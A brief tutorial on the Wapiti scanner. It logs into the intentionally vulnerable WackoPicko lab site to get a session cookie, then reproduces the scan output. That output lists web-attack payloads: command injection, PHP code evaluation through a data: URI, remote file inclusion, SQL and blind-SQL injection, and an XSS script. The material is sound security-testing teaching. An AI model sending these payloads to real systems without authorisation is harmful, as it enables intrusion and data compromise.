@@ -1,0 +1,149 @@
+Hello,
+
+Here is a really fast tutorial on Wapiti and Wapiti-getcookie usage to show how to login to a website to retrieve cookies
+then use the generated cookie file to launch a Wapiti scan.
+
+First, I use wapiti-getcookie to login in the restricted area and get the cookie in cookies.json :
+
+bash-4.2$ wapiti-getcookie -u http://wackopicko/users/login.php -c cookies.json
+<Cookie PHPSESSID=aofe1utktsh6q4blip8nr9820lksehjf0tr3019vm6bq8v1ca6d1 for wackopicko/>
+
+Choose the form you want to use or enter 'q' to leave :
+0) GET http://wackopicko/pictures/search.php?query=&x=1&y=1 (0)
+1) POST http://wackopicko/users/login.php (0)
+        data: username=&password=
+
+Enter a number : 1
+
+Please enter values for the following form:
+url = http://wackopicko/users/login.php
+username: wanda
+password: wanda
+<Cookie PHPSESSID=aofe1utktsh6q4blip8nr9820lksehjf0tr3019vm6bq8v1ca6d1 for wackopicko/>
+
+It can also be done with wapiti-getcookie this way (if you have all necessary informations about the form) :
+wapiti-getcookie -u http://wackopicko/users/login.php -c cookies.json -d "username=wanda&password=wanda"
+
+Then, I scan the vulnerable website using the cookie and excluding the logout script :
+
+bash-4.2$ wapiti -u http://wackopicko/ -x http://wackopicko/users/logout.php -c cookies.json
+
+ ██╗    ██╗ █████╗ ██████╗ ██╗████████╗██╗██████╗ 
+ ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║╚════██╗
+ ██║ █╗ ██║███████║██████╔╝██║   ██║   ██║ █████╔╝
+ ██║███╗██║██╔══██║██╔═══╝ ██║   ██║   ██║ ╚═══██╗
+ ╚███╔███╔╝██║  ██║██║     ██║   ██║   ██║██████╔╝
+  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝╚═════╝  
+Wapiti-3.0.0 (wapiti.sourceforge.net)
+[*] Saving scan state, please wait...
+
+ Note
+========
+This scan has been saved in the file /home/devloop/.wapiti/scans/wackopicko_folder_30e1d821.db
+[*] Wapiti found 41 URLs and forms during the scan
+[*] Loading modules:
+         mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay, mod_buster, mod_shellshock
+
+[*] Launching module exec
+---
+Received a HTTP 500 error in http://wackopicko/admin/index.php
+Evil request:
+    GET /users/WackoPicko/website/admin/index.php?page=%3Benv HTTP/1.1
+    Host: wackopicko
+---
+---
+PHP evaluation in http://wackopicko/admin/index.php via injection in the parameter page
+Evil request:
+    GET /users/WackoPicko/website/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: wackopicko
+---
+---
+Received a HTTP 500 error in http://wackopicko/admin/index.php
+Evil request:
+    POST /users/WackoPicko/website/admin/index.php?page=%3Benv HTTP/1.1
+    Host: wackopicko
+    Referer: http://wackopicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+---
+PHP evaluation in http://wackopicko/admin/index.php via injection in the parameter page
+Evil request:
+    POST /users/WackoPicko/website/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: wackopicko
+    Referer: http://wackopicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module file
+---
+Remote inclusion vulnerability in http://wackopicko/admin/index.php via injection in the parameter page
+Evil request:
+    GET /users/WackoPicko/website/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: wackopicko
+---
+---
+Remote inclusion vulnerability in http://wackopicko/admin/index.php via injection in the parameter page
+Evil request:
+    POST /users/WackoPicko/website/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: wackopicko
+    Referer: http://wackopicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module sql
+---
+Received a HTTP 500 error in http://wackopicko/admin/index.php
+Evil request:
+    GET /users/WackoPicko/website/admin/index.php?page=%C2%BF%27%22%28 HTTP/1.1
+    Host: wackopicko
+---
+---
+Received a HTTP 500 error in http://wackopicko/admin/index.php
+Evil request:
+    POST /users/WackoPicko/website/admin/index.php?page=%C2%BF%27%22%28 HTTP/1.1
+    Host: wackopicko
+    Referer: http://wackopicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module xss
+---
+XSS vulnerability in http://wackopicko/pictures/search.php via injection in the parameter query
+Evil request:
+    GET /users/WackoPicko/website/pictures/search.php?query=%22%2F%3E%3Cscript%3Ealert%28%27wj6bncic12%27%29%3C%2Fscript%3E&x=1&y=1 HTTP/1.1
+    Host: wackopicko
+    Referer: http://wackopicko/
+---
+
+[*] Launching module blindsql
+---
+Received a HTTP 500 error in http://wackopicko/admin/index.php
+Evil request:
+    GET /users/WackoPicko/website/admin/index.php?page=sleep%287%29%231 HTTP/1.1
+    Host: wackopicko
+---
+---
+Received a HTTP 500 error in http://wackopicko/admin/index.php
+Evil request:
+    POST /users/WackoPicko/website/admin/index.php?page=sleep%287%29%231 HTTP/1.1
+    Host: wackopicko
+    Referer: http://wackopicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module permanentxss
+
+Report
+------
+A report has been generated in the file /home/devloop/.wapiti/generated_report
+Open /home/devloop/.wapiti/generated_report/wackopicko_12292017_1342.html with a browser to see this report.
